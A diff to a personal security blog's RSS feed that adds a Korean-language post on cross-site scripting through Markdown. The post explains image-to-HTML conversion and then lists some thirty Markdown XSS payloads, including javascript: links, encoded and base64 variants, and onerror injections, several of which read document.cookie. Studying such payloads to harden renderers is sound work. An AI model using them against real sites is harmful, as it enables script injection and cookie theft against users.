@@ -6,7 +6,84 @@
         <description>Recent content on SooHo&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 18 Jun 2022 16:07:41 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 26 Jun 2022 09:40:46 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Markdown XSS</title>
+        <link>https://appealso.github.io/p/markdown-xss/</link>
+        <pubDate>Sun, 26 Jun 2022 09:40:46 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/markdown-xss/</guid>
+        <description>&lt;img src="https://appealso.github.io/cover.png" alt="Featured image of post Markdown XSS" /&gt;&lt;p&gt;최근 Markdown편집기에서 XSS 공격이 가능한 것을 알게되어 정리합니다.&lt;/p&gt;
+&lt;h2 id=&#34;markdown이란&#34;&gt;Markdown이란?&lt;/h2&gt;
+&lt;p&gt;Markdown은 콘텐츠를 작성하고 형식을 지정하기 위한 간단한 언어입니다. GitHub의 Gists 및 readme 파일 등에서 사용됩니다.&lt;/p&gt;
+&lt;h2 id=&#34;markdown-이미지-등록-예시&#34;&gt;Markdown 이미지 등록 예시&lt;/h2&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://appealso.github.io/markdown.jpeg&#34; &gt;
+		&lt;img src=&#34;https://appealso.github.io/markdown.jpeg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;춘식&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;춘식&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Markdown 파일에서 아래와 같은 Markdown 코드를 작성하면 위에 이미지가 나오는 것을 확인 할 수있습니다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;![&lt;span class=&#34;nt&#34;&gt;춘식&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;./markdown.jpeg&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;여기서 알 수 있는 것은 Markdown 문법으로 작성하면 이를 HTML로 변환 해준다는 것을 알 수있습니다. 위에 Markdown코드의 경우 아래의 html로 바뀔 것 입니다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;./markdown.jpeg&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;춘식&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;이를 활용하면 XSS Exploit이 가능합니다. 아래의 EX01의 markdown을 작성하면 EX01의 HTML로 변환되면서 공격이 가능할 것을 확인할 수 있습니다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;EX01 - Markdown&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;![&lt;span class=&#34;nt&#34;&gt;XSS&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;&amp;#34;onerror=&amp;#34;alert(&amp;#39;XSS&amp;#39;&lt;/span&gt;))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;EX01 - HTML&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;alert(&amp;#39;XSS&amp;#39;) alt=&amp;#34;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;xss&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exploit-code&#34;&gt;Exploit Code&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:prompt(document.cookie&lt;/span&gt;))
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;j    a   v   a   s   c   r   i   p   t:prompt(document.cookie&lt;/span&gt;))
+![&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&lt;/span&gt;)\
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&lt;/span&gt;)
+![&lt;span class=&#34;nt&#34;&gt;a&amp;#39;&amp;#34;`onerror=prompt(document.cookie)&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;x&lt;/span&gt;)\
+[citelol]: (javascript:prompt(document.cookie))
+[&lt;span class=&#34;nt&#34;&gt;notmalicious&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:window.onerror=alert;throw%20document.cookie&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;test&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript://%0d%0aprompt(1&lt;/span&gt;))
+[&lt;span class=&#34;nt&#34;&gt;test&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript://%0d%0aprompt(1&lt;/span&gt;);com)
+[&lt;span class=&#34;nt&#34;&gt;notmalicious&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:window.onerror=alert;throw%20document.cookie&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;notmalicious&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript://%0d%0awindow.onerror=alert;throw%20document.cookie&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:this;alert(1&lt;/span&gt;))
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:this;alert(1&amp;amp;#41;&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript&amp;amp;#58this;alert(1&amp;amp;#41;&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;Javas&amp;amp;#99;ript:alert(1&amp;amp;#41;&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;Javas%26%2399;ript:alert(1&amp;amp;#41;&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:alert&amp;amp;#65534;(1&amp;amp;#41;&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:confirm(1&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript://www.google.com%0Aprompt(1&lt;/span&gt;))
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript://%0d%0aconfirm(1&lt;/span&gt;);com)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:window.onerror=confirm;throw%201&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:alert(document.domain&amp;amp;#41;&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript://www.google.com%0Aalert(1&lt;/span&gt;))
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;&amp;#39;javascript:alert(&amp;#34;1&amp;#34;&lt;/span&gt;)&amp;#39;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;JaVaScRiPt:alert(1&lt;/span&gt;))
+![&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;https://www.google.com/image.png&amp;#34;onload=&amp;#34;alert(1&lt;/span&gt;))
+![&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;&amp;#34;onerror=&amp;#34;alert(1&lt;/span&gt;))
+&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;/http://&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;?php\&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;\h&lt;span class=&#34;nt&#34;&gt;1&lt;/span&gt;\&amp;gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;script:script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;confirm(2)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;.alert(1&lt;/span&gt;);)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]]&lt;/span&gt;)
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;http://a?p=[[/onclick=alert(0&lt;/span&gt;) .]])
+[&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;](&lt;span class=&#34;na&#34;&gt;javascript:new%20Function`al\ert\`1\``;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;참고&#34;&gt;참고&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>N00bzCTF - [Crpyto] - RSA</title>
         <link>https://appealso.github.io/p/n00bzctf-crpyto-rsa/</link>
         <pubDate>Sat, 18 Jun 2022 16:07:41 +0900</pubDate>
